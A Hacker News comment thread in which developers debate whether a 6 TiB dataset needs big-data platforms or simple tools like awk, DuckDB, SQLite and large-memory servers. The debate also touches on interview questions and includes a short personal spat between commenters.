fifilura 5 hours agorootparentprevFWIW I am the same. I tend to recommend BigQuery and AWS/Athena in various posts. Many times paired with Parquet. But it is because it makes a lot of things much simpler, and that a lot of people have not realized that. Tooling is moving fast in this space, it is not 2004 anymore. His arguments are still valid and 86 days is a pretty long time. reply pdimitar 7 hours agoparentprevBlows my mind. I am a backend programmer and a semi-decent sysadmin and I would have immediately told you: \"make a ZFS or BCacheFS pool with 20-30% redundancy bits and just go wild with CLI programs, I know dozens that work on CSV and XML, what's the problem?\". And I am not a specialized data scientist. But with time I am wondering if such a thing even exists... being a good backender / sysadmin and knowing a lot of CLI tools has always seemed to do the job for me just fine (though granted I never actually managed a data lake, so I am likely over-simplifying it). reply nevi-me 7 hours agorootparentTo be fair on candidates, CLI programs create technical debt the moment they're written. A good answer that strikes a balance between size of data, latency and frequency requirements is a candidate who is able to show that they can choose the right tool that the next person will be comfortable with. reply pdimitar 7 hours agorootparentTrue on the premise, yep, though I'm not sure how using CLI programs like LEGO blocks creates a tech debt? reply ImPostingOnHN 6 hours agorootparentI remember replacing a CLI program built like Lego blocks. It was 90-100 LEGO blocks, written over the course of decades, in: Cobol; Fortran; C; Java; Bash; and Perl, and the Legos \"connected\" with environmental variables. Nobody wanted to touch it lest they break it. Sometimes it's possible to do things too smartly. Apache Spark runs locally (and via CLI). reply pdimitar 6 hours agorootparentNo no, I didn't mean that at all. I meant a script using well-known CLI programs. Obviously organically grown Frankenstein programs are a huge liability, I think every reasonable techie agrees on that. reply actionfromafar 5 hours agorootparentWell your little CLI-query is suddenly in production and then... it easily escalates. reply pdimitar 5 hours agorootparentI already said I never managed a data lake and simply got stuff when it was needed but if you need to criticize then by all means, go wild. reply __MatrixMan__ 5 hours agorootparentprevTrue but it's typically less debt than anything involving a gui, pricetag, or separate server. reply ImPostingOnHN 6 hours agorootparentprev> But with time I am wondering if such a thing even exists Check out \"data science at the command line\": https://jeroenjanssens.com/dsatcl/ reply WesolyKubeczek 7 hours agorootparentprev> just go wild with CLI programs, I know dozens that work on CSV and XML ...or put it into SQLite for extra blazing fastness! No kidding. reply pdimitar 7 hours agorootparentThat's included in CLI tools. Also duckdb and clickhouse-local are amazing. reply c0brac0bra 6 hours agorootparentclickhouse-local had been astonishingly fast for operating on many GB of local CSVs. I had a heck of a time running the server locally before I discovered the CLI. reply WesolyKubeczek 7 hours agorootparentprevI need to learn more about the latter for some log processing... reply fijiaarone 6 hours agorootparentLog files aren’t data. That’s your first problem. But that’s the only thing that most people have that generates more bytes than can fit on screen in a single spreadsheet. reply thfuran 6 hours agorootparentOf course they are. They just aren't always structured nicely. reply WesolyKubeczek 5 hours agorootparentprevEverything is data if you are brave enough. reply apwell23 5 hours agorootparentprev> make a ZFS or BCacheFS pool with 20-30% redundancy bits and just go wild with CLI programs Lol. Data management is about safety, auditablity, access control, knowledge sharing and who bunch of other stuff. I would've immediately shown you the door as someone who i cannot trust data with. reply photonthug 5 hours agorootparent> Lol. Data management is about safety, auditablity, access control, knowledge sharing and who bunch of other stuff. I would've immediately shown you the door as someone who i cannot trust data with. No need to act smug and superior, especially since nothing about OP's plan here actually precludes having all the nice things you mentioned, or even having them inside $your_favorite_enterprise_environment. You risk coming across as a person who feels threatened by simple solutions, perhaps someone who wants to spend $500k in vendor subscriptions every year for simple and/or imaginary problems... exactly the type of thing TFA talks about. But I'll ask the question.. why do you think safety, auditablity, access control, and knowledge sharing are incompatible with CLI tools and a specific choice of file system? What's your preferred alternative? Are you sticking with that alternative regardless of how often the work load runs, how often it changes, and whether the data fits in memory or requires a cluster? reply apwell23 4 hours agorootparent> No need to act smug and superior I responded with the same tone that gp responded with. \"blows my mind\" ( that people can be so stupid) . reply photonthug 4 hours agorootparentAnother comment mentions this classic meme: > Consulting service: you bring your big data problems to me, I say \"your data set fits in RAM\", you pay me $10,000 for saving you $500,000. A lot of industry work really does fall into this category, and it's not controversial to say that going the wrong way on this thing is mind-blowing. More than not being controversial, it's not confrontational, because his comment was essentially re: the industry, whereas your comment is directed at a person. Drive by sniping where it's obvious you don't even care to debate the tech itself might get you a few \"sick burn, bro\" back-slaps from certain crowds, or the FUD approach might get traction with some in management, but overall it's not worth it. You don't sound smart or even professional, just nervous and afraid of every approach that you're not already intimately familiar with. reply apwell23 4 hours agorootparenti repurposed the parent comment \"not understanding the scale of \"real\" big data was a no-go in my eyes when hiring.\" , \"real winner\" ect. But yea you are right. I shouldn't have directed it at commenter. I was miffed at interviewers who use \"tricky questions\" and expect people to read their minds and come up with their preconceived solution. reply pdimitar 4 hours agorootparentprevThe classic putting words in people's mouths technique it is then. The good old straw man. If you really must know: I said \"blows my mind [that people don't try simpler and proven solutions FIRST]\". I don't know what do you have to gain to come here and pretend to be in my head. Now here's another thing that blows my mind. reply apwell23 4 hours agorootparent> that people don't try simpler and proven solutions FIRST Well why don't people do that according to you ? Its not 'mind blowing' to me because you can never guess what angle interviewer is coming at you. Especially when they use the words like ' data stack'. reply StrLght 3 hours agorootparent> you can never guess what angle interviewer is coming at you Why would you guess in that situation though? It’s an interview, there’s at least 1 person talking to you — you should talk to them, ask them questions, share your thoughts. If you talking to them is a red flag, then high chances that you wouldn’t want to work there anyway. reply pdimitar 3 hours agorootparentprevI don't know why and this is why I said it's mind-blowing. Because to me trying stuff that can work on most laptops comes naturally in my head as the first viable solution. As for interviews, sure, they have all sorts of traps. It really depends on the format and the role. Since I already disclaimed that I am not actual data scientist and just a seasoned dev who can make some magic happen without a dedicated data team (if/when the need arises) then I wouldn't even be in a data scientist interview in the first place. ¯\\_(ツ)_/¯ reply apwell23 3 hours agorootparentThats fair. My comment wasn't directed at you. I was trying to be smart and write an inverse of original comment. Where I as an interviewer was looking for a proper 'data stack' and interviewee responded with a bespoke solution. \"not understanding the scale of \"real\" big data was a no-go in my eyes when hiring.\" reply pdimitar 3 hours agorootparentSure, okay, I get it. My point was more like \"Have you tried this obvious thing first that a lot of devs can do for you without too much hassle?\". If I were to try for a dedicated data scientist position then I'd have done homework. reply HelloNurse 4 hours agorootparentprevAbstractly, \"safety, auditablity, access control, knowledge sharing\" are about people reading and writing files: simplifying away complicated management systems improves security. The operating system should be good enough. reply zaphar 5 hours agorootparentprevWhat about his answer prevents any of that? As stated the question didn't require any of what you outline here. ZFS will probably do a better job of protecting your data than almost any other filesystem out there so it's not a bad foundation to start with if you want to protect data. Your entire post reeks of \"I'm smarter than you\" smugness while at the same time revealing no useful information or approaches. Near as I can tell no one should trust you with any data. reply apwell23 4 hours agorootparent> Your entire post reeks of \"I'm smarter than you\" unlike \"blows my mind\" ? > As stated the question didn't require any of what you outline here. Right. OP mentioned it was \"tricky question\" . What makes it tricky is that all those attributes are implicitly assumed. I wouldn't interview at google and tell them my \"stack\" is \"load it on your laptop\". I would never say that in an interview even if I think that's the right \"stack\" . reply zaphar 4 hours agorootparent\"blows my mind\" is similar in tone yes. But I wasn't replying to the OP. Further the OP actually goes into some detail about how he would approach the problem. You do not. You are assuming you know what the OP meant by tricky question. And your assumption contradicts the rest of the OP's post regarding what he considered good answers to the question and why. reply pdimitar 3 hours agorootparentHonest question: was \"blows my mind\" so offensive? Thought it was quite obvious I meant that \"it blows my mind people don't try the simpler stuff first, especially having in mind that it works for much bigger percentage than cloud providers would have you believe\"? I guess it wasn't but even if so, it would be legitimately baffling how people manage to project so much negativity in three words that are slightly tongue-in-cheek casual comment on the state of affairs in an area whose value is not always clear (in my observations, only after you start having 20+ data sources it starts to pay off to have dedicated data team; I've been in teams only 3-4 devs and we still managed to have 15-ish data dashboards for the executives without too much cursing). An anecdote, surely, but what isn't? reply zaphar 2 hours agorootparentI generally don't find that sort of thing offensive when combined with useful alternative approaches like your post provided. However the phrase does come with a connotation that you are surprised by a lack of knowledge or skill in others. That can be taken as smug or elitist by someone in the wrong frame of mind. reply pdimitar 1 hour agorootparentThank you, that's helpful. reply pdimitar 5 hours agorootparentprevI already qualified my statement quite well by stating my background but if it makes you feel better then sure, show me the door. :) I was never a data scientist, just a guy who helped whenever it was necessary. reply apwell23 4 hours agorootparent> I already qualified my statement quite well by stating my background No. You qualified it with \"blows my mind\" . Why would it 'blow your mind' if you don't have any data background. reply zaphar 4 hours agorootparentHe didn't say he didn't have any data background. He's clearly worked with data on several occasions as needed. reply pdimitar 4 hours agorootparentprevAre you trolling? Did you miss the part where I said I worked with data but wouldn't say I'm a professional data scientist? This negative cherry picking does not do your image any favors. reply apwell23 3 hours agorootparentprevEdit: for above comment. My comment wasn't directed at parent. I was trying to be smart and write an inverse of original comment. Opposite scenario Where I as an interviewer was looking for a proper 'data stack' and interviewee responded with a bespoke solution. \"not understanding the scale of \"real\" big data was a no-go in my eyes when hiring.\" i was trying to point out that you can never know where the interviewer is coming from. Unless i know interviewer personally i would bias towards playing it safe and go with 'enterpisey stack' reply koverstreet 5 hours agorootparentprevthis is how you know when someone takes themself too seriously buddy, you're just rolling off buzzwords and lording it over other people reply apwell23 4 hours agorootparentbuddy you suffer from NIH syndrome upset that no one wants your 'hacks'. reply citizenpaul 1 hour agoparentprevThe funny thing is that is exactly the place I want to work at. I've only found one company so far and the owner sold during the pandemic. So far my experience is that amount of companies/people that want what you describe is incredibly low. I wrote a comment on here the other day that some place I was trying to do work for was using $11k USD a month on a BigQuery DB that had 375MB of source data. My advice was basically you need to hire a data scientist that knows what they are doing. They were not interested and would rather just band-aid the situation for a \"cheap\" employee. Despite the fact their GCP bill could pay for a skilled employee. As I've seen it for the last year job hunting most places don't want good people. They want replaceable people. reply filleokus 6 hours agoparentprevI think I've written about it here before, but I imported ≈1 TB of logs into DuckDB (which compressed it to fit in RAM of my laptop) and was done with my analysis before the data science team had even ingested everything into their spark cluster. (On the other hand, I wouldn't really want the average business analyst walking around with all our customer data on their laptops all the time. And by the time you have a proper ACL system with audit logs and some nice way to share analyses that updates in real time as new data is ingested, the Big Data Solution™ probably have a lower TCO...) reply marcosdumay 5 hours agorootparent> And by the time you have ... the Big Data Solution™ probably have a lower TCO... I doubt it. The common Big Data Solutions manage to have a very high TCO, where the least relevant share is spent on hardware and software. Most of its cost comes from reliability engineering and UI issues (because managing that \"proper ACL\" that doesn't fit your business is a hell of a problem that nobody will get right). reply riku_iki 3 hours agorootparentprevyou probably didn't do joins for example on your dataset, because DuckDB is OOMing on them if they don't fit memory. reply marginalia_nu 6 hours agoparentprevProblem is possibly that most people with that sort of hands-on intuition for data don't see themselves as data scientists and wouldn't apply for such a position. It's a specialist role, and most people with the skills you seek are generalists. reply deepsquirrelnet 4 hours agorootparentYeah it’s not really what you should be hiring a data scientist to do. I’m of the opinion that if you don’t have a data engineer, you probably don’t need a data scientist. And not knowing who you need for a job causes a lot of confusion in interviews. reply thunky 6 hours agoparentprev> requirements of \"6 TiB of data\" How could anyone answer this without knowing how the data is to be used (query patterns, concurrent readers, writes/updates, latency, etc)? Awk may be right for some scenarios, but without specifics it can't be a correct answer. reply marginalia_nu 4 hours agorootparentThose are very appropriate follow up questions I think. If someone tasks you to deal with 6 TiB of data, it is very appropriate to ask enough questions until you can provide a good solution, far better than to assume the questions are unknowable and blindly architect for all use cases. reply kbolino 5 hours agoparentprevEven if a 6 terabyte CSV file does fit in RAM, the only thing you should do with it is convert it to another format (even if that's just the in-memory representation of some program). CSV stops working well at billions of records. There is no way to find an arbitrary record because records are lines and lines are not fixed-size. You can sort it one way and use binary search to find something in it in semi-reasonable time but re-sorting it a different way will take hours. You also can't insert into it while preserving the sort without rewriting half the file on average. You don't need Hadoop for 6 TB but, assuming this is live data that changes and needs regular analysis, you do need something that actually works at that size. reply KronisLV 4 hours agoparentprev> The winner of course was the guy who understood that 6TiB is what 6 of us in the room could store on our smart phones, or a $199 enterprise HDD (or three of them for redundancy), and it could be loaded (multiple times) to memory as CSV and simply run awk scripts on it. If it's not a very write heavy workload but you'd still want to be able to look things up, wouldn't something like SQLite be a good choice, up to 281 TB: https://www.sqlite.org/limits.html It even has basic JSON support, if you're up against some freeform JSON and not all of your data neatly fits into a schema: https://sqlite.org/json1.html A step up from that would be PostgreSQL running in a container: giving you the support for all sorts of workloads, more advanced extensions for pretty much anything you might ever want to do, from geospatial data with PostGIS, to something like pgvector, timescaledb etc., while still having a plethora of drivers and still not making your drown in complexity and having no issues with a few dozen/hundred TB of data. Either of those would be something that most people on the market know, neither will make anyone want to pull their hair out and they'll give you the benefit of both quick data writes/retrieval, as well as querying. Not that everything needs or can even work with a relational database, but it's still an okay tool to reach for past trivial file storage needs. Plus, you have to build a bit less of whatever functionality you might need around the data you store, in addition to there even being nice options for transparent compression. reply randomtoast 6 hours agoparentprevNow, you have to consider the cost it takes for you whole team to learn how to use AWK instead of SQL. Then you do these TCO calculations and revert back to the BigQuery solution. reply kjkjadksj 5 hours agorootparentFor someone who is comfortable with sql we are talking minutes to hours to figure out awk well enough to see how its used or use it. reply noisy_boy 3 hours agorootparentIt is not only about whether people can figure it out awk. It is also about how supportable the solution is. SQL provides many features specifically to support complex querying and is much more accessible to most people - you can't reasonably expect your business analysts to do complex analysis using awk. Not only that, it provides a useful separation from the storage format so you can use it to query a flat file exposed as table using Apache Drill or a file on s3 exposed by Athena or data in an actual table stored in a database and so on. The flexibility is terrific. reply clwg 5 hours agorootparentprevNot necessarily. I always try to write to disk first, usually in a rotating compressed format if possible. Then, based on something like a queue, cron, or inotify, other tasks occur, such as processing and database logging. You still end up at the same place, and this approach works really well with tools like jq when the raw data is in jsonl format. The only time this becomes an issue is when the data needs to be processed as close to real-time as possible. In those instances, I still tend to log the raw data to disk in another thread. reply RodgerTheGreat 5 hours agorootparentprevWith the exception of regexes- which any programmer or data analyst ought to develop some familiarity with anyway- you can describe the entirety of AWK on a few sheets of paper. It's a versatile, performant, and enduring data-handling tool that is already installed on all your servers. You would be hard-pressed to find a better investment in technical training. reply tomrod 6 hours agorootparentprevAbout $20/month for chatgpt or similar copilot, which really they should reach for independently anyhow. reply randomtoast 5 hours agorootparentAnd since the data scientist cannot verify the very complex AWK output that should be 100% compatible with his SQL query, he relies on the GPT output for business-critical analysis. reply tomrod 5 hours agorootparentOnly if your testing frameworks are inadequate. But I belive you could be missing or mistaken on how code generation successfully integrates into a developer and data scientist's work flow. Why not take a few days to get familiar with AWK, a skill which will last a lifetime? Like SQL, it really isn't so bad. reply randomtoast 4 hours agorootparentIt is easier to write complex queries in SQL instead of AWK. I know both AWK and SQL, and I find SQL much easier for complex data analysis, including JOINS, subqueries, window functions, etc. Of course, your mileage may vary, but I think most data scientists will be much more comfortable with SQL. reply elicksaur 3 hours agorootparentprevMany people have noted how when using LLMs for things like this, the person’s ultimate knowledge of the topic is less than it would’ve otherwise been. This effect then forces the person to be reliant on the LLM for answering all questions, and they’ll be less capable of figuring out more complex issues in the topic. $20/mth is a siren’s call to introduce such a dependency to critical systems. reply SkipperCat 21 minutes agoparentprevThat makes total sense if you're archiving the data, but what happens when you want to have 10,000 people have access to read/update the data concurrently. Then you start to need some fairly complex solutions. reply dahart 3 hours agoparentprevWait, how would you split 6 TiB across 6 phones, how would you handle the queries? How long will the data live, do you need to handle schema changes, and how? And what is the cost of a machine with 15 or 20 TiB of RAM (you said it fits in memory multiple times, right?) - isn’t the drive cost irrelevant here? How many requests per second did you specify? Isn’t that possibly way more important than data size? Awk on 6 TiB, even in memory, isn’t very fast. You might need some indexing, which suddenly pushes your memory requirement above 6 TiB, no? Do you need migrations or backups or redundancy? Those could increase your data size by multiples. I’d expect a question that specified a small data size to be asking me to estimate the real data size, which could easily be 100 TiB or more. reply the_real_cher 6 hours agoparentprevHow would six terabytes fit into memory? It seems like it would get a lot of swap thrashing if you had multiple processes operating on disorganized data. I'm not really a data scientist and I've never worked on data that size so I'm probably wrong. reply coldtea 6 hours agorootparent>How would six terabytes fit into memory? What device do you have in mind? I've seen places use 2TB RAM servers, and that was years ago, and it isn't even that expensive (can get those for about $5K or so). Currently HP allows \"up to 48 DIMM slots which support up to 6 TB for 2933 MT/s DDR4 HPE SmartMemory\". Close enough to fit the OS, the userland, and 6 TiB of data with some light compression. >It seems like it would get a lot of swap thrashing if you had multiple processes operating on disorganized data. Why would you have \"disorganized data\"? Or \"multiple processes\" for that matter? The OP mentions processing the data with something as simple as awk scripts. reply fijiaarone 6 hours agorootparent“How would six terabytes fit into memory?” A better question would be: Why would anyone stream 6 terabytes of data over the internet? In 2010 the answer was: because we can’t fit that much data in a single computer, and we can’t get accounting or security to approve a $10k purchase order to build a local cluster, so we need to pay Amazon the same amount every month to give our ever expanding DevOps team something to do with all their billable hours. That may not be the case anymore, but our devops team is bigger than ever, and they still need something to do with their time. reply the_real_cher 5 hours agorootparentWell yeah streaming to the cloud to work around budget issues is a while nother convo haha. reply the_real_cher 5 hours agorootparentprevI mean if you're doing data science the data is not always organized and of course you would want multi-processing. 1 TB of memory is like 5 grand from a quick Google search then you probably need specialized motherboards. reply coldtea 4 hours agorootparent>I mean if you're doing data science the data is not always organized and of course you would want multi-processing Not necessarily - I might not want it or need it. It's a few TB, it can be on a fast HD, on an even faster SSD, or even in memory. I can crunch them quite fast even with basic linear scripts/tools. And organized could just mean some massaging or just having them in csv format. This is already the same rushed notions about \"needing this\" and \"must have that\" that the OP describes people jumping to, that leads them to suggest huge setups, distributed processing, multi-machine infrastructure, for use cases and data sizes that could fit on a single server with redundancy and be done it. DHH has often written about this for their Basecamp needs (scalling vertically where others scale horizontally having worked for them for most of their operation), there's also this classic post: https://adamdrake.com/command-line-tools-can-be-235x-faster-... >1 TB of memory is like 5 grand from a quick Google search then you probably need specialized motherboards. Not that specialized, I've work with server deployments (HP) with 1, 1.5 and 2TB RAM (and > 100 cores), it's trivial to get. And 5 or even 30 grand would still be cheaper (and more effective and simpler) than the \"big data\" setups some of those candidates have in mind. reply the_real_cher 3 hours agorootparentYeah I agree about over engineering. Im just trying to understand the parent to my original comment. How would running awk for analysis on 6TB of data work quickly and efficiently? They say it would go into memory but its not clear to me how that would work as would still have paging and thrashing issues if the data didnt have often used sections of the data. am I overthinking it and they were they just referring to buying a big ass Ram machine? reply allanbreyes 6 hours agorootparentprevThere are machines that can fit that and more: https://yourdatafitsinram.net/ I'm not advocating that this is generally a good or bad idea, or even economical, but it's possible. reply the_real_cher 5 hours agorootparentI'm trying to understand what the person I'm replying to had in mind when they said fit six terabytes in memory and search with awk. is this what they were referring to just by a big ass Ram machine? reply jandrewrogers 3 hours agorootparentprev6 TB does not fit in memory. However, with a good storage engine and fast storage this easily fits within the parameters of workloads that have memory-like performance. The main caveat is that if you are letting the kernel swap that for you then you are going to have a bad day, it needs to be done in user space to get that performance which constrains your choices. reply capitol_ 5 hours agorootparentprevIt would easy fit in ram: https://yourdatafitsinram.net/ reply xLaszlo 12 minutes agoparentprev6TB - Snowflake Why? That's the boring solution. If you don't have a use case, what kind of queries you would run then opt for maximum flexibility with the minimum setup of a managed solution. If cost is prohibitive on the long run, you can figure out a more tailored solution based on the revealed preferences. Fiddling with CSVs is the DWH version of the legendary \"Dropbox HN commenter\". reply lizknope 4 hours agoparentprevI'm on some reddit tech forums and people will say \"I need help storing a huge amount of data!\" and people start offering replies for servers that store petabytes. My question is always \"How much data do you actually have?\" Many times you they reply with 500GB or 2TB. I tell that that isn't much data when you can get 1TB micro SD card the size of a fingernail or a 24TB hard drive. My feeling is that if you really need to store petabytes of data that you aren't going to ask how to do it on reddit. If you need to store petabytes you will have an IT team and substantial budget and vendors that can figure it out. reply geraldwhen 7 hours agoparentprevI ask a similar question on screens. Almost no one gives a good answer. They describe elaborate architectures for data that fits in memory, handily. reply mcny 7 hours agorootparentI think that’s the way we were taught in college / grad school. If the premise of the class is relational databases, the professor says, for the purpose of this course, assume the data does not fit in memory. Additionally, assume that some normalization is necessary and a hard requirement. Problem is most students don’t listen to the first part “for the purpose of this course”. The professor does not elaborate because that is beyond the scope of the course. reply kmarc 7 hours agorootparentFWIW if they were juniors, I would've continued the interview and direct them with further questions, and observer their flow of thinking to decide if they are good candidates to pursue further. But no, this particular person had been working professionally for decades (in fact, he was much older than me). reply geraldwhen 1 hour agorootparentYeah. I don’t even bother asking juniors this. At that level I expect that training will be part of the job, so it’s not a useful screener. reply acomjean 5 hours agorootparentprevI took a Hadoop class. We learned hadoop and were told by the instructor we probably wouldn’t’t need it, and learned some other Java processing techniques (streams etc) reply Joel_Mckay 7 hours agorootparentprevPeople can always find excuses to boot candidates. I would just back-track from a shipped product date, and try to guess who we needed to get there... given the scope of requirements. Generally, process people from a commercially \"institutionalized\" role are useless for solving unknown challenges. They will leave something like an SAP, C#, or MatLab steaming pile right in the middle of the IT ecosystem. One could check out Aerospike rather than try to write their own version (the dynamic scaling capabilities are very economical once setup right.) Best of luck, =3 reply jandrewrogers 3 hours agoparentprevAs a point of reference, I routinely do fast-twitch analytics on tens of TB on a single, fractional VM. Getting the data in is essentially wire speed. You won't do that on Spark or similar but in the analytics world people consistently underestimate what their hardware is capable of by something like two orders of magnitude. That said, most open source tools have terrible performance and efficiency on large, fast hardware. This contributes to the intuition that you need to throw hardware at the problem even for relatively small problems. In 2024, \"big data\" doesn't really start until you are in the petabyte range. reply EdwardDiego 5 hours agoparentprevIf you were hiring me for a data engineering role and asked me how to store and query 6 TiB, I'd say you don't need my skills, you've probably got a Postgres person already. reply torginus 3 hours agoparentprevIt's astonishing how shit the cloud is compared to boring-ass pedestrian technology. For example, just logging stuff into a large text file is so much easier, performant and searchable that using AWS CloudWatch, presumably written by some of the smartest programmers who ever lived. On another note I was once asked to create a big data-ish object DB, and me, knowing nothing about the domain, and a bit of benchmarking, decided to just use zstd-compressed json streams with a separate index in an sql table. I'm sure any professional would recoil at it in horror, but it could do literally gigabytes/sec retrieval or deserialization on consumer grade hardware. reply sfilipco 7 hours agoparentprevI agree that keeping data local is great and should be the first option when possible. It works great on 10GB or even 100GB, but after that starts to matter what you optimize for because you start seeing execution bottlenecks. To mitigate these bottlenecks you get fancy hardware (e.g oracle appliance) or you scale out (and get TCO/performance gains from separating storage and compute - which is how Snowflake sold 3x cheaper compared to appliances when they came out). I believe that Trino on HDFS would be able to finish faster than awk on 6 enterprise disks for 6TB data. In conclusion I would say that we should keep data local if possible but 6TB is getting into the realm where Big Data tech starts to be useful if you do it a lot. reply hectormalot 44 minutes agorootparentI wouldn't underestimate how much a modern machine with a bunch of RAM and SSDs can do vs HDFS. This post[1] is now 10 years old and has find + awk running an analysis in 12 seconds (at speed roughly equal to his hard drive) vs Hadoop taking 26 minutes. I've had similar experiences with much bigger datasets at work (think years of per-second manufacturing data across 10ks of sensors). I get that that post is only on 3.5GB, but, consumer SSDs are now much faster at 7.5GB/s vs 270MB/s HDD back when the article was written. Even with only mildly optimised solutions, people are churning through the 1 billion rows (±12GB) challenge in seconds as well. And, if you have the data in memory (not impossible) your bottlenecks won't even be reading speed. [1]: https://adamdrake.com/command-line-tools-can-be-235x-faster-... reply nottorp 6 hours agorootparentprev> I agree that keeping data local is great and should be the first option when possible. It works great on 10GB or even 100GB, but after that starts to matter what you optimize for because you start seeing execution bottlenecks. The point of the article is 99.99% of businesses never pass even the 10 Gb point though. reply sfilipco 6 hours agorootparentI agree with the theme of the article. My reply was to parent comment which has a 6 TB working set. reply jrm4 5 hours agoparentprevThis feels representative of so many of our problems in tech, overengineering, over-\"producting,\" over-proprietary-ing, etc. Deep centralization at the expense of simplicity and true redundancy; like renting a laser cutter when you need a boxcutter, a pair of scissors, and the occasional toenail clipper. reply tonetegeatinst 58 minutes agoparentprevI'm not even in data science, but I am a slight data hoarder. And heck even I'd just say throw that data on a drive and have a backup in the cloud and on a cold hard drive. reply throwaway_20357 6 hours agoparentprevIt depends on what you want to do with the data. It can be easier to just stick nicely-compressed columnar Parquets in S3 (and run arbitrarily complex SQL on them using Athena or Presto) than to try to achieve the same with shell-scripting on CSVs. reply fock 5 hours agorootparenthow exactly is this solution easier than putting the very Parquet files on a classic filesystem. Why does the easy solution require an amazon-subscription? reply boppo1 7 hours agoparentprevYou have 6 TiB of ram? reply chx 6 hours agorootparentIf my business depended on it? I can click a few buttons and have a 8TiB Supermicro server on my doorstep in a few days if I wanted to colo that. EC2 High Memory instances offer 3, 6, 9, 12, 18, and 24 TiB of memory in an instance if that's the kind of service you want. Azure Mv2 also does 2850 - 11400GiB. So yes, if need to be, I have 6 TiB of RAM. reply qaq 7 hours agorootparentprevYou can have 8TB RAM in a 2U box for under 100K. grab a couple and it will save you millions a year compared to over-engineered bigdata setup. reply apwell23 6 hours agorootparentBigquery and snowflake are software. They come with a sql engine, data governance, integration with your ldap, auditing. Loading data into snowflake isn't overegineering. What you described is over-engineering. No business is passing 6tb data around on their laptops. reply qaq 4 hours agorootparentSo is ClickHouse your point being ? Please point out what a server being able to have 8TB of RAM has to do with laptops. reply david_allison 6 hours agorootparentprevhttps://yourdatafitsinram.net/ reply compressedgas 6 hours agorootparentWas posted as https://news.ycombinator.com/item?id=9581862 in 2015 reply vitus 7 hours agorootparentprevIf you're one of the public clouds targeting SAP use cases, you probably have some machines with 12TB [0, 1, 2]. [0] https://aws.amazon.com/blogs/aws/now-available-amazon-ec2-hi... [1] https://cloud.google.com/blog/products/sap-google-cloud/anno... [2] https://azure.microsoft.com/en-us/updates/azure-mv2-series-v... reply lizknope 4 hours agorootparentprevI personally don't but our computer cluster at work as around 50,000 CPU cores. I can request specific configurations through LSF and there are at least 100 machines with over 4TB RAM and that was 3 years ago. By now there are probably machines with more than that. Those machines are usually reserved for specific tasks that I don't do but if I really needed it I could get approval. reply bluedino 5 hours agorootparentprevWe are decomming our 5-year old 4TB systems this year and could have been ordered with more reply ninkendo 7 hours agorootparentprevYou don’t need that much ram to use mmap(2) reply marginalia_nu 6 hours agorootparentTo be fair, mmap doesn't put your data in RAM, it presents it as though it was in RAM and has the OS deal with whether or not it actually is. reply cess11 7 hours agorootparentprevThe \"(multiple times)\" part probably means batching or streaming. But yeah, they might have that much RAM. At a rather small company I was at we had a third of it in the virtualisation cluster. I routinely put customer databases in the hundreds of gigabytes into RAM to do bug triage and fixing. reply kmarc 7 hours agorootparentIndeed, what I meant to say is that you can load it in multiple batches. However, now thinking, I did play around with servers of TiBs of memory :-) reply 7thaccount 5 hours agoparentprevI am a big fan of these simplistic solutions. In my own area, it was incredibly frustrating as what we needed was a database with a smaller subset of the most recent information from our main long-term storage database for back end users to do important one-off analysis with. This should've been fairly cheap, but of course the IT director architect guy wanted to pad his resume and turn it all into multi-million project with 100 bells and whistles that nobody wanted. reply TeamDman 13 minutes agoparentprevWould probably try https://github.com/pola-rs/polars and go from there lol reply rr808 6 hours agoparentprevIf you look at the article the data space is more commonly 10GB which matches my experience. For these sizes definitely simple tools are enough. reply itronitron 1 hour agoparentprev>> \"6 TiB of data\" is not somewhat detailed requirements, as it depends quite a bit on the nature of the data. reply dfgdfg34545456 4 hours agoparentprevThe problem with your question is that they are there to show off their knowledge. I failed a tech interview once, question was build a web page/back end/db that allows people to order let's say widgets, that will scale huge. I went the simpleton answer route, all you need is Rails, a redis cache and an AWS provisioned relational DB, solve the big problems later if you get there sort of thing. Turns out they wanted to hear all about microservices and sharding. reply bee_rider 6 hours agoparentprevThere’d still have to be some further questions, right? I guess if you store it on the interview group’s cellphones you’ll have to plan on what to do if somebody leaves or the interview room is hit by a meteor, if you plan to store it in ram on a server you’ll need some plan for power outages. reply paulddraper 18 minutes agoparentprevStoring 6TB is easy. Precessing and querying it is trickier. reply buremba 2 hours agoparentprevI can’t really think of a product with the requirement of max 6TiB data. If the data is big as TiB, most products have 100x TiB rather than a few ones. reply apwell23 6 hours agoparentprevWhat kind of business just has a static set of 6TiB data that people are loading on their laptops. You tricked candidates with your nonsensical scenario. Hate smartass interviewers like this that are trying some gotcha to feel smug about themselves. Most candidates don't feel comfortable telling ppl 'just load on your laptops' even if they think thats sensible. They want to present a 'professional solution', esp when you tricked them with the word 'stack'. which is how most of them prbly perceived your trick question. This comment is so infuriating to me. Why be assholes to each other when world is already full of them. reply yxwvut 4 hours agorootparentWell put. Whoever asked this question is undoubtedly a nightmare to work with. Your data is the engine that drives your business and its margin improvements, so why hamstring yourself with a 'clever' cost saving but ultimately unwieldy solution that makes it harder to draw insight (or build models/pipelines) from? Penny wise and pound foolish, plus a dash of NIH syndrome. When you're the only company doing something a particular way (and you're not Amazon-scale), you're probably not as clever as you think. reply tomrod 5 hours agorootparentprevI disagree with your take. Your surly rejoinder aside, the parent commenter identifies an area where senior level knowledge and process appropriately assess a problem. Not every job interview is satisfying checklist of prior experience or training, but rather assessing how well that skillset will fit the needed domain. In my view, it's an appropriate question. reply apwell23 4 hours agorootparentWhat did you gather as 'needed domain' from that comment. 'needed domain' is often implicit, its not a blank slate. candidates assume all sorts of 'needed domain' even before the interview starts, if i am interviewing at bank I wouldn't suggest 'load it on your laptops' as my 'stack'. OP even mentioned that it his favorite 'tricky question' . It would def trick me because they used the word 'stack' which has specific meaning in the industry. There are even websites dedicated to 'stack's https://stackshare.io/instacart/instacart reply marcosdumay 4 hours agorootparentprev> What kind of business just has a static set of 6TiB data that people are loading on their laptops. Most business have static sets of data that people load on their PCs. (Why do you assume laptops?) The only weird part of that question is that 6TiB is so big it's not realistic. reply pizzafeelsright 2 hours agorootparentprevBig data companies or those that work with lots of data. The largest dataset I worked with was about 60TB While that didn't fit in ram most people would just load the sample data into the cluster when I told them it would be faster to load 5% locally and work off that. reply wg0 4 hours agoparentprevI have lived through the hype of Big data it was a time of HDFS+HTable I guess and Hapoop etc. One can't go wrong with DuckDB+SQLite+Open/Elasticsearch either with 6 to 8 even 10 TB of data. [0]. https://duckdb.org/ reply rgrieselhuber 4 hours agoparentprevThis is a great test / question. More generally, it tests knowledge with basic linux tooling and mindset as well as experience level with data sizes. 6TiB really isn't that much data these days, depending on context and storage format, etc. of course. reply deepsquirrelnet 4 hours 